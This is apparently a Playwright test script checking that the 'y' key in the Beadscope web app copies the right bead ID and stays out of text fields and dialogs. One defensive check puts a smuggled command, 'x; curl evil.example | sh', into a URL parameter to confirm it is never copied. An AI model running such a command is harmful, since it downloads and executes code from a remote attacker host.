// Y copies the selected (or drawer-open) bead's ID; project data is intercepted.
import assert from 'node:assert/strict';
import { chromium } from 'playwright';
const base = process.env.BEADSCOPE_TEST_URL;
assert.ok(base, 'Set BEADSCOPE_TEST_URL to an isolated demo server');
const bead = id => ({id, title: `Copy ${id}`, status:'open', issue_type:'task', priority:2, labels:[], dependencies:[], created_at:'2026-09-01T00:00:00Z', updated_at:'2026-09-01T00:00:00Z'});
const beads = [bead('copy-a'), bead('copy-b')];
let failBeads = false;
const browser=await chromium.launch();
let page;
const errors=[];
try {
 const context=await browser.newContext({viewport:{width:1500,height:1000}});
 await context.grantPermissions(['clipboard-read','clipboard-write'],{origin:new URL(base).origin});
 page=await context.newPage(); page.setDefaultTimeout(8000);
 page.on('pageerror',e=>errors.push(e.message));
 await page.route('**/api/p/demo/**', async route=>{
  const path=new URL(route.request().url()).pathname;
  if(path.endsWith('/beads/stream')) return route.abort();
  if(path.endsWith('/beads') && failBeads) return route.fulfill({status:500,json:{error:'down'}});
  if(path.endsWith('/beads')) return route.fulfill({json:{beads,meta:{kind:'demo',humanActor:'reviewer',humanAllowlist:['reviewer'],pollIntervalMs:300000}}});
  return route.fulfill({json:beads.find(b=>path.endsWith(`/beads/${b.id}`))??{}});
 });
 const item=id=>page.locator(`[data-keyboard-bead-id="${id}"]`).first();
 const setClipboard=text=>page.evaluate(t=>navigator.clipboard.writeText(t),text);
 const clipboard=()=>page.evaluate(()=>navigator.clipboard.readText());
 const expectClipboard=async(want,msg)=>{await page.waitForFunction(w=>navigator.clipboard.readText().then(t=>t===w),want).catch(()=>{});assert.equal(await clipboard(),want,msg);};
 await page.goto(`${base}/p/demo`);
 await item('copy-a').waitFor();
 await page.getByRole('button',{name:'Board',exact:true}).click();
 await item('copy-a').focus(); await page.keyboard.press('y');
 await expectClipboard('copy-a','y copies the board selection');
 await page.getByText('Copied copy-a',{exact:true}).waitFor();
 // The drawer is an overlay, but y must still copy the bead it shows.
 await item('copy-b').focus(); await page.keyboard.press('Enter');
 await page.getByRole('dialog').getByRole('heading',{name:'Copy copy-b',exact:true}).waitFor();
 await setClipboard('sentinel'); await page.keyboard.press('y');
 await expectClipboard('copy-b','y copies the bead open in the drawer');
 await page.keyboard.press('Escape'); await page.getByRole('dialog').waitFor({state:'detached'});
 await setClipboard('sentinel');
 await page.keyboard.press('/'); await page.locator('input[data-search]').press('y');
 assert.equal(await page.locator('input[data-search]').inputValue(),'y');
 await page.locator('input[data-search]').fill(''); await page.locator('input[data-search]').press('Tab');
 await page.keyboard.press('?');
 const help=page.getByRole('dialog',{name:/keyboard shortcuts/i}); await help.waitFor();
 await help.getByText('Copy selected issue ID',{exact:true}).waitFor();
 await page.keyboard.press('y');
 await page.keyboard.press('Escape'); await help.waitFor({state:'detached'});
 assert.equal(await clipboard(),'sentinel','y is ignored in text fields and dialogs');
 await page.keyboard.press('g'); await page.keyboard.press('y');
 await page.getByRole('heading',{name:'Needs You',exact:true}).waitFor();
 assert.equal(await clipboard(),'sentinel','G then Y still opens Needs You');
 // A G left pending when the drawer opens must not turn y into navigation.
 await page.keyboard.press('g'); await page.keyboard.press('b');
 await item('copy-a').waitFor();
 await setClipboard('sentinel');
 await page.keyboard.press('g'); await item('copy-a').getByText('Copy copy-a',{exact:true}).click();
 await page.getByRole('dialog').getByRole('heading',{name:'Copy copy-a',exact:true}).waitFor();
 await page.keyboard.press('y');
 await expectClipboard('copy-a','y over the drawer copies even with a G pending');
 await page.keyboard.press('Escape'); await page.getByRole('dialog').waitFor({state:'detached'});
 // Until the beads load, ?bead= is unchecked URL text and must never be copied.
 failBeads = true; await setClipboard('sentinel');
 const failed = page.waitForResponse(r=>new URL(r.url()).pathname.endsWith('/beads'));
 await page.goto(`${base}/p/demo?bead=${encodeURIComponent('x; curl evil.example | sh')}`);
 await failed; await page.evaluate(()=>document.activeElement?.blur());
 await page.keyboard.press('y');
 assert.equal(await clipboard(),'sentinel','an unloaded ?bead= value is not copied');
 failBeads = false;
 assert.deepEqual(errors,[]);
 console.log('PASS: y copies the selected or drawer bead ID, stays out of inputs and dialogs, ignores a pending G over the drawer and unloaded ?bead= text, and G Y still navigates');
} catch(e){console.error({errors,url:page?.url(),body:page?(await page.locator('body').innerText()).slice(0,2500):''});throw e;}
finally {await browser.close();}
